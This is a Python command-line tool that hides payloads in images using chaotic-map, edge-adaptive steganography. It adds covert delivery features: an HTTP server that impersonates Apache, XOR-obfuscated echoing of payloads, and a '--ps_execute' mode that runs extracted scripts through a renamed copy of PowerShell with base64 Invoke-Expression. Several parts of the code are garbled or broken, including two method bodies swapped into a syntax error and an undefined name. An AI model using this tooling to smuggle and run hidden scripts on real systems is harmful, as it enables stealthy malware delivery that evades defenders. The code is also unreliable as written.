#!/usr/bin/env python
# coding:UTF-8
import argparse
import base64
import http.server
import os
import socketserver
import sys
from typing import Union

import cv2
import numpy as np


class SteganographyError(Exception):
    pass


CYAN = "\x1b[36m"
RED = "\x1b[31m"
RESET = "\x1b[0m"


class ChaosEdgeSteg:
    def __init__(self, __key: str, img_path: str, **kwargs):
        self.verbose = kwargs.get('verbose', False)
        self.debug = kwargs.get('debug', False)
        self.quiet = kwargs.get('quiet', False)
        self.gray_img = None
        self.edge_map = None
        self.save_bitmaps = kwargs.get('save_bitmaps', False)
        self.prefix, self.key = __key.split('::', 1)
        self.payload_len = int(self.prefix, 16)
        self.image_path = img_path
        if kwargs.get('output_path', None) is not None:
            self.output_dir = os.path.dirname(kwargs['output_path'])
        else:
            self.output_dir = os.getcwd()
        self.edge_coords = self.get_edge_coordinates(cv2.imread(img_path))

    def print_message(self, message, msg_type='regular'):
        if self.quiet and msg_type != 'debug':
            return
        if msg_type == 'debug' and self.debug:
            print(f'[*] {message}')
        elif msg_type == 'verbose' and self.verbose:
            print(f'[*] {message}')
        elif msg_type == 'regular':
            print(f'[{RED}*{RESET}] {message}')
    
    @staticmethod
    def sha256_hashgen(__o: Union[str, bytes]):
        from hashlib import sha256
        if isinstance(__o, str):
            __o = __o.encode('utf-8')
        return sha256(__o).hexdigest()

    def save_bitmap(self, __img, __output_path):
        if self.save_bitmaps:
            output_dirname = self.output_dir
            bitmaps_dir = os.path.join(output_dirname, 'bitmaps')
            if not os.path.exists(bitmaps_dir):
                os.makedirs(bitmaps_dir)
            bitmap_path = os.path.join(bitmaps_dir, __output_path)
            cv2.imwrite(bitmap_path, __img)

    @staticmethod
    def data_to_bin(__o: Union[str, bytes]):
        if isinstance(__o, str):
            return ''.join(format(ord(i), '08b') for i in __o)
        elif isinstance(__o, bytes):
            return ''.join(format(byte, '08b') for byte in __o)

    @staticmethod
    def entropy(__key: str):
        from collections import Counter
        from math import log2
        char_count = Counter(__key)
        total_chars = len(__key)
        entropy = 0
        for char, count in char_count.items():
            prob = count / total_chars
            entropy -= prob * log2(prob)
        return entropy

    def adaptive_thresholds(self, __img: np.ndarray):
        self.print_message('Calculating adaptive thresholds...', msg_type='verbose')
        base_lower, base_upper = (45, 135)
        min_lower, min_upper = (85, 255)

        filtered_img = cv2.bilateralFilter(__img, d=9, sigmaColor=75, sigmaSpace=75)
        standard_edge_map = cv2.Canny(filtered_img, base_lower, base_upper)
        edge_density = cv2.countNonZero(standard_edge_map) / (filtered_img.shape[0] * filtered_img.shape[1])
        norm_payload_size = self.payload_len / (filtered_img.shape[0] * filtered_img.shape[1])
        payload_influence = norm_payload_size * 100

        self.print_message(f'Normalized payload size: {norm_payload_size}', msg_type='debug')
        self.print_message(f'Edge density: {edge_density}', msg_type='debug')
        self.print_message(f'Payload influence: {payload_influence}', msg_type='debug')

        if 2 <= payload_influence < 2.5:
            import warnings
            warnings.warn(
                'Payload size approaching limit for the given cover image', Warning)
        elif payload_influence >= 2.5:
            raise SteganographyError(
                'Payload is too large for the given cover image')

        threshold_scale = 1 - (edge_density + payload_influence)  # Scale the thresholds towards min values
        lower = int(base_lower + threshold_scale * (min_lower - base_lower))
        upper = int(base_upper + threshold_scale * (min_upper - base_upper))
        self.print_message(f'Thresholds after combined density adjustment: {lower, upper}', msg_type='debug')
        return lower, upper

    def get_edge_coordinates(self, img: np.ndarray):
        gray_img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        self.gray_img = gray_img
        lower_threshold, upper_threshold = self.adaptive_thresholds(img)
        edge_map = cv2.Canny(gray_img, lower_threshold, upper_threshold)
        self.save_bitmap(edge_map, 'edge_map.png')
        self.edge_map = edge_map
        edge_coordinates: np.ndarray = np.column_stack(np.where(edge_map))
        return edge_coordinates

    def henon_map(self):
        from mpmath import mp
        mp.dps = 50
        x, y = [mp.mpf('0.1')], [mp.mpf('0.1')]
        henon_params = self.henon_parameters(self.key)
        a: float = mp.mpf(henon_params[0])
        b: float = mp.mpf(henon_params[1])
        for i in range(self.payload_len * 8):
            next_x = y[-1] + mp.mpf('1.0') - a * x[-1] ** 2
            next_y = b * x[-1]
            x.append(next_x)
            y.append(next_y)
        x = [float(val) for val in x]
        y = [float(val) for val in y]
        return x, y

    def henon_parameters(self, __key: str):
        self.print_message('Generating Henon parameters from key...', msg_type='verbose')
        entropy = self.entropy(__key)

        a = 1.4 - (0.2 * (entropy / 8))
        b = 0.3 + (0.1 * (entropy / 8))

        self.print_message(f'Key entropy: {entropy}', msg_type='debug')
        self.print_message(f'Parameter a: {a}', msg_type='debug')
        self.print_message(f'Parameter b: {b}', msg_type='debug')

        return a, b

    def map_edges_to_henon(self):
        self.print_message('Detecting edges...', msg_type='verbose')
        edge_coords = self.edge_coords
        if len(edge_coords) == 0:
            raise SteganographyError(
                'No edge coordinates detected')

        henon_map = np.column_stack(self.henon_map())
        norm_indices = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
        norm_indices *= (len(edge_coords) - 1)
        norm_indices = norm_indices.astype(int)

        self.print_message(f'Payload length: {self.payload_len}', msg_type='debug')
        self.print_message(f'Available indices: {str(len(norm_indices))}', msg_type='debug')
        self.print_message('Mapping chaotic trajectory to edge coordinates...')

        available_edge_mask = np.ones(len(edge_coords), dtype=bool)
        final_edge_coords = []
        from tqdm import tqdm
        for index in tqdm(
                norm_indices[:, 0], total=len(norm_indices), disable=self.quiet,
                bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]', ascii='.#', leave=False):
            original_index = index  # Store original index to check for full loop without available edge
            while not available_edge_mask[index]:
                index = (index + 1) % len(edge_coords)
                if index == original_index:  # Raise error if no available edges found after full loop
                    raise SteganographyError(
                        'Exhausted all available edge coordinates: Payload is too large for the input image')
            final_edge_coords.append(edge_coords[index])
            available_edge_mask[index] = False

        final_edge_coords = np.array(final_edge_coords)
        edge_map = np.zeros_like(self.gray_img)
        edge_map[final_edge_coords[:, 0], final_edge_coords[:, 1]] = 255
        self.save_bitmap(edge_map, 'selected_edge_map.png')
        return final_edge_coords

    def embed(self, __payload: Union[str, bytes], __img_path: str):
        self.print_message('Embedding payload...')
        bin_payload = self.data_to_bin(__payload)
        s_key = '::'.join([self.prefix, self.key])
        key_hash = self.sha256_hashgen(s_key)
        bin_key_hash = bin(int(key_hash, 16))[2:].zfill(256)
        bin_payload = bin_key_hash + bin_payload
        bin_payload_length = len(bin_payload)
        img = cv2.imread(__img_path)
        bin_idx = 0
        mod_channels = {}
        for coord in self.map_edges_to_henon():
            if bin_idx >= bin_payload_length:
                break
            y, x = coord
            coord_key = (x, y)
            channel = mod_channels.get(coord_key, 0)
            if channel > 2:
                continue
            img[y, x, channel] = (img[y, x, channel] & ~1) | int(bin_payload[bin_idx])
            mod_channels[coord_key] = channel + 1
            bin_idx += 1
        return img

    def extract(self, __img_path) -> bytes:
        if __img_path == self.image_path:
            raise SteganographyError(
                'Stego image is same as input image')
        self.print_message('Extracting payload...')
        stego_img = cv2.imread(__img_path)
        edge_coords = np.column_stack(np.where(self.edge_map))
        henon_map = np.column_stack(self.henon_map())
        norm_indices: np.ndarray = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
        norm_indices *= (len(edge_coords) - 1)
        norm_indices = norm_indices.astype(int)
        edge_mask = np.ones(len(edge_coords), dtype=bool)
        final_edge_coords = []
        for index in norm_indices[:, 0]:
            while not edge_mask[index]:
                index = (index + 1) % len(edge_coords)
            final_edge_coords.append(edge_coords[index])
            edge_mask[index] = False
        out_bits = []
        mod_channels = {}
        final_edge_coords = np.array(final_edge_coords)
        for coord in final_edge_coords[:self.payload_len * 8]:
            y, x = coord
            coord_key = (x, y)
            channel = mod_channels.get(coord_key, 0)
            if channel > 2:
                continue
            out_bit = stego_img[y, x, channel] & 1
            out_bits.append(str(out_bit))
            mod_channels[coord_key] = channel + 1
        out_str = ''.join(out_bits)
        out_bin_payload = int(out_str, 2).to_bytes((len(out_str) + 7) // 8, byteorder='big')
        out_bin_key_hash = out_bin_payload[:32]
        out_key_hash = out_bin_key_hash.hex()
        s_key = f'{self.prefix}::{self.key}'.encode()
        in_key_hash = self.sha256_hashgen(s_key)

        if out_key_hash != in_key_hash:
            raise SteganographyError(
                'Invalid key')

        self.print_message(f'Extracted hash: {out_key_hash}', msg_type='debug')
        self.print_message(f'Generated hash: {in_key_hash}', msg_type='debug')

        extracted_payload = out_bin_payload[32:]
        return extracted_payload


class PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    out_payload = None

    def __init__(self, *args, echo=False, quiet=False, obfuscate=False, steg_obj=None, filename=None, **kwargs):
        self.log_printed = False
        self.echo = echo
        self.quiet = quiet
        self.obfuscate = obfuscate
        self.steg_obj = steg_obj
        self.filename = filename
        super().__init__(*args, **kwargs)

    def print_message(self, message):
        if not self.quiet:

    def log_message(self, format, *args):
            print(f'[{CYAN}*{RESET}] {message}')
        if not self.log_printed:
            self.print_message(
                f'Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}')
            self.log_printed = True

    def version_string(self):
        return 'Apache/2.4.29 (Ubuntu)'

    def do_PUT(self):
        def xor_obf(data, values):
            for val in values:
                data = bytes([b ^ val for b in data])
            return data

        if not self.log_printed:
            self.log_message('Received %s request', self.command)
            self.log_printed = True
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        with open(self.filename, 'wb') as f:
            f.write(body)
        PutHTTPRequestHandler.out_payload = self.steg_obj.extract(self.filename)
        if PutHTTPRequestHandler.out_payload[:4] == b'PK\x03\x04':
            self.send_response(400)  # Bad Request
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            if self.echo:
                self.wfile.write(b'Error: ZIP archive detected.')
            else:
                self.wfile.write(b' ')
            self.server.stop = True
            return
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        if self.echo:
            if self.obfuscate:
                obf_payload = xor_obf(base64.b64encode(PutHTTPRequestHandler.out_payload), [0x55, 0xFF])
                self.wfile.write(obf_payload)
            else:
                self.wfile.write(PutHTTPRequestHandler.out_payload)
        else:
            self.wfile.write(b' ')
        self.server.stop = True


class PayloadHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, quiet=False, filename=None, **kwargs):
        self.quiet = quiet
        self.log_printed = False
        self.filename = filename
        super().__init__(*args, **kwargs)

    def print_message(self, message):
        if not self.quiet:
            print(f'[{Fore.CYAN}*{Fore.RESET}] {message}')

    def log_message(self, format, *args):
        if not self.log_printed:
            self.print_message(
                f'Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}')
            self.log_printed = True

    def do_GET(self):
        if not self.log_printed:
            self.log_message('Received %s request', self.command)
            self.log_printed = True
        if self.path == '/' + self.filename:
            super().do_GET()
            self.server.stop = True


def make_handler_instance(filename: str, dirname: str, quiet: bool):
    class CustomHandler(PayloadHTTPRequestHandler):
        
        def __init__(self, *args, **kwargs):
            super().__init__(
                *args, quiet=quiet, filename=filename, directory=dirname, **kwargs
            )
    
    return CustomHandler


def start_http_put_server(__obj, __filename, ns: argparse.Namespace):
    echo_val = ns.echo
    obf_val = ns.obfuscate
    msg_prefix = f'[{CYAN}*{RESET}]' if not ns.quiet else '#'
    handler = lambda *args: PutHTTPRequestHandler(
        *args, echo=echo_val, obfuscate=obf_val, steg_obj=__obj, filename=__filename
    )
    httpd = socketserver.TCPServer(
        (ns.remote_stego_image[1], int(ns.remote_stego_image[2])), handler
    )
    httpd.timeout = 1
    httpd.stop = False
    print(
        '{0} PUT server listening on http://{1}:{2}/'.format(
            msg_prefix,
            *ns.remote_stego_image
        )
    )
    try:
        while not httpd.stop:
            httpd.handle_request()
        print(f'{msg_prefix} Connection closed')
    except KeyboardInterrupt:
        print(f'{msg_prefix} KeyboardInterrupt: Aborting...')
        httpd.server_close()
        exit(0)


def handle_http_server(__handler, lhost, lport, args: argparse.Namespace):
    httpd = socketserver.TCPServer((lhost, lport), __handler)
    httpd.timeout = 1
    httpd.stop = False
    msg_prefix = f'[{CYAN}*{RESET}]' if not args.quiet else '#'
    print(
        f'{msg_prefix} GET server listening on http://{lhost}:{lport}/{args.remote_output_file[0]}'
    )
    try:
        while not httpd.stop:
            httpd.handle_request()
        print(f'{msg_prefix} Connection closed')
    except KeyboardInterrupt:
        print(f'{msg_prefix} KeyboardInterrupt: Connection closed')
        httpd.server_close()
        return


def serve_http_payload(__payload: Union[str, bytes], args: argparse.Namespace):
    if args.remote_output_file:
        output_file_path, lhost, lport = args.remote_output_file
        save_payload(__payload, output_file_path)
        handler_class = make_handler_instance(output_file_path, os.getcwd(), args.quiet)
        handle_http_server(handler_class, lhost=lhost, lport=int(lport), args=args)
        os.remove(output_file_path)
        exit(0)


def save_payload(__payload: Union[str, bytes], __filepath: str):
    with open(__filepath, 'wb' if isinstance(__payload, bytes) else 'w') as file:
        file.write(__payload)


def exec_ps(__payload: str, *, exec_type: str):
    from shutil import copy2, which
    from subprocess import Popen
    from tempfile import gettempdir
    if exec_type not in ['pwsh', 'py']:
        return
    b64_script = base64.b64encode(__payload.encode('utf-8')).decode('utf-8')
    if which('PowerShell.exe'):
        ps_path = which('PowerShell.exe')
        tmp_ps_path = os.path.join(gettempdir(), 'tmp_pwsh.exe')
        copy2(ps_path, tmp_ps_path)
        if exec_type == 'pwsh':
            ps_cmd = f"""{tmp_ps_path} -noprofile -noninteractive Invoke-Expression \
                    \"$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')))\""""
        else:
            ps_cmd = f"""{tmp_ps_path} -noprofile -noninteractive -Command \
                    [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')) | python"""
        process = Popen(ps_cmd, shell=True)
        process.communicate()
        os.remove(tmp_ps_path)
    elif which('pwsh'):
        ps_cmd = f"""pwsh -noprofile -noninteractive -Command \
                [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')) | python"""
        process = Popen(ps_cmd, shell=True)
        process.communicate()
    else:
        raise ValueError(
            "'ps_execute': Unable to find 'PowerShell' or 'PowerShell Core' on this system")


def handle_payload(__payload: bytes, args: argparse.Namespace):
    def handle_zip():
        output_file_path = args.output_file if args.output_file else 'extracted.zip'
        save_payload(__payload, output_file_path)
        if not args.quiet:
            print(f"Extracted ZIP archive saved as '{output_file_path}'")
    
    def handle_txt():
        extracted_text = __payload.decode('utf-8', errors='replace')
        prefix = 'Obfuscated payload' if args.obfuscate else 'Payload'
        if not (args.quiet or args.echo) and not args.output_file:
            print('\nExtracted payload:\n')
        if args.echo:
            print(f'[{CYAN}*{RESET}] {prefix} echoed back to remote host')
        elif args.ps_execute:
            exec_ps(extracted_text, exec_type=args.ps_execute)
        else:
            print(f'{extracted_text}')
        if args.output_file:
            if os.path.splitext(args.output_file)[1] not in ['.txt', '.py']:
                output_file_path = os.path.splitext(args.output_file)[0] + '.txt'
            else:
                output_file_path = args.output_file
            save_payload(extracted_text, output_file_path)
            print(f"Extracted payload saved as '{output_file_path}'")

    handle_zip() if __payload[:4] == b'PK\x03\x04' else handle_txt()


def embed(args: argparse.Namespace):
    if args.payload and args.payload_file:
        raise ValueError(
            "Cannot use '-p' and '-f' simultaneously")
    if args.payload:
        if os.path.isfile(args.payload) and args.payload.endswith(('.txt', '.py', '.ps1')):
            with open(args.payload, 'rb') as file:
                payload = file.read()
                payload = payload.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
        else:
            payload = args.payload.encode()
    elif args.payload_file:
        if not os.path.isfile(args.payload_file):
            raise FileNotFoundError(
                f"File does not exist: '{os.path.abspath(args.payload_file)}'")
        if not args.payload_file.endswith('.zip'):
            ValueError(
                "Invalid payload file type. Only '.zip' archives are supported")
        with open(args.payload_file, 'rb') as file:
            payload = file.read()
    else:
        raise ValueError(
            "Either '-p' or '-f' must be provided to specify the payload")
    payload_len = len(payload.encode('utf-8')) if isinstance(payload, str) else len(payload)
    payload_and_hash_len = payload_len + 32
    hex_len = f'{payload_and_hash_len:04X}'
    prefixed_key_str = f'{hex_len}::{args.key}'
    steg = ChaosEdgeSteg(
        prefixed_key_str, args.cover_image_path, output_path=args.output_image_path, save_bitmaps=args.save_bitmaps,
        quiet=args.quiet, verbose=args.verbose, debug=args.debug)
    stego_image = steg.embed(payload, args.cover_image_path)
    if args.save_key:
        if args.output_image_path:
            dirname = os.path.dirname(args.output_image_path)
        else:
            dirname = os.getcwd()
            print('No output image path was specified. Saving key to the current directory')
        key_path = os.path.join(dirname, 'key.txt')
        with open(key_path, 'w') as file:
            file.write(prefixed_key_str)
        print(f"Key saved as '{key_path}'")
    elif not args.save_key:
        print(f"Key with hex length appended: '{prefixed_key_str}'") if not args.quiet else print(prefixed_key_str)
    if args.output_image_path:
        output_img_path = os.path.splitext(args.output_image_path)[0] + '.png'
    else:
        dirname = os.getcwd()
        output_img_path = os.path.join(
            dirname, f'stego_{os.path.splitext(os.path.basename(args.cover_image_path))[0]}.png')
    cv2.imwrite(output_img_path, stego_image)
    if not args.quiet:
        print(f"Stego image saved as '{output_img_path}'")


def extract(args: argparse.Namespace):
    from re import match as regex_match
    if not regex_match(r'^[0-9A-Fa-f]+::', args.key):
        raise ValueError(
            f"Unexpected key format: Does not match '[HEX_LENGTH]::[KEY]': '{args.key}'")
    if args.ps_execute and (args.echo or args.remote_output_file):
        raise ValueError(
            "'ps_execute': Cannot be used with remote options")
    if args.ps_execute and not args.quiet:
        args.quiet = True
    if args.echo and not args.remote_stego_image:
        raise ValueError(
            "'echo': Can only be used with 'remote_stego_image'")
    steg = ChaosEdgeSteg(
        args.key, args.cover_image_path, output_path=None, save_bitmaps=False, quiet=args.quiet, verbose=args.verbose,
        debug=args.debug)

    def handle_remote():
        filename, lhost, lport = args.remote_stego_image
        if os.path.splitext(filename)[1] != '.png':
            raise ValueError(
                "Invalid file format for stego image: Only '.png' images are supported.")
        start_http_put_server(steg, filename, args)
        extracted_payload = PutHTTPRequestHandler.out_payload if PutHTTPRequestHandler.out_payload else steg.extract(
            filename)
        handle_payload(extracted_payload, args)
        serve_http_payload(extracted_payload, args)

    def handle_local():
        extracted_payload = steg.extract(args.stego_image_path)
        handle_payload(extracted_payload, args)
        serve_http_payload(extracted_payload, args)

    handle_remote() if args.remote_stego_image else handle_local()


def main_cli():
    from .banner import BANNER
    
    parser = argparse.ArgumentParser(
        description='chaos-based edge adaptive steganography tool'
    )
    subparsers = parser.add_subparsers()

    # Embed action arguments
    embed_parser = subparsers.add_parser('embed', help='Embed payload into an image')
    embed_parser.add_argument('-c', '--cover_image_path', required=True, help='Path to the cover image')
    embed_parser.add_argument(
        '-p', '--payload', type=str, help='Payload to embed directly into the image as a string. '
                                          f'Can also be a filepath (\'.txt\', \'.py\')')
    embed_parser.add_argument('-f', '--payload_file', type=str, help='Path to the payload file (\'.zip\' archive)')
    embed_parser.add_argument('-k', '--key', required=True, help='Key to use for embedding')
    embed_parser.add_argument(
        '-o', '--output_image_path', default=None,
        help='Path to save the output stego image. If not specified, defaults to '
             '\'stego_<cover_image_name>\'')
    embed_parser.add_argument(
        '--save_key', action='store_true', default=False, help='Save key as a text file in the '
                                                               'output directory')
    embed_parser.add_argument('--save_bitmaps', action='store_true', default=False, help='Save edge bitmaps')
    embed_parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Enable verbose output')
    embed_parser.add_argument('-vv', '--debug', action='store_true', default=False, help='Enable debug output')
    embed_parser.add_argument('-q', '--quiet', action='store_true', default=False, help='Suppress output messages')
    embed_parser.set_defaults(func=embed)

    # Extract action arguments
    extract_parser = subparsers.add_parser('extract', help='Extract payload from a stego image')
    extract_parser.add_argument(
        '-c', '--cover_image_path', required=True, help='Path to the original cover image used during embedding')
    stego_image = extract_parser.add_mutually_exclusive_group(required=True)
    stego_image.add_argument(
        '-i', '--stego_image_path', type=str, help='Path to the stego image from which to extract the payload.')
    stego_image.add_argument(
        '-iR', '--remote_stego_image', nargs=3, metavar=('FILENAME', 'LHOST', 'LPORT'),
        help='Start HTTP PUT server to receive stego image')
    extract_parser.add_argument(
        '-k', '--key', required=True, help='Key used during embedding, with the payload length appended (e.g., '
                                           '\'0000::key\')')
    extract_output = extract_parser.add_mutually_exclusive_group()
    extract_output.add_argument(
        '-o', '--output_file', default=None, help='Path to save the extracted payload. If not specified, '
                                                  'the message is printed to the console')
    extract_output.add_argument(
        '-oR', '--remote_output_file', nargs=3, metavar=('FILENAME', 'LHOST', 'LPORT'),
        help='Save extracted payload and serve it for download.')
    echo_group = extract_parser.add_argument_group('Echo options', 'Options related to echoing back the payload')
    echo_group.add_argument(
        '--echo', action='store_true', default=False,
        help='Echo back responses to remote client. Only used with [-iR/--remote_stego_image]')
    obfuscate_group = echo_group.add_mutually_exclusive_group(required=False)
    obfuscate_group.add_argument(
        '--obfuscate', action='store_true', default=False, help='Obfuscate the echoed payload. Requires \'--echo\'')
    extract_parser.add_argument('--save_bitmaps', action='store_true', default=False, help='Save edge bitmaps')
    verbosity = extract_parser.add_mutually_exclusive_group()
    verbosity.add_argument('-v', '--verbose', action='store_true', default=False, help='Enable verbose output')
    verbosity.add_argument('-vv', '--debug', action='store_true', default=False, help='Enable debug output')
    extract_parser.add_argument('-q', '--quiet', action='store_true', default=False, help='Suppress output messages')
    extract_parser.add_argument(
        '-psx', '--ps_execute', type=str, default=False,
        help='Executes the extracted payload in a temp PowerShell instance. Valid params: ('
             '\'python\', \'pwsh\')')
    extract_parser.set_defaults(func=extract)
    
    if len(sys.argv) == 1:
        print(BANNER)
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    if not args.quiet:
        print(BANNER)
    
    args.func(args)


if __name__ == '__main__':
    sys.exit(main_cli())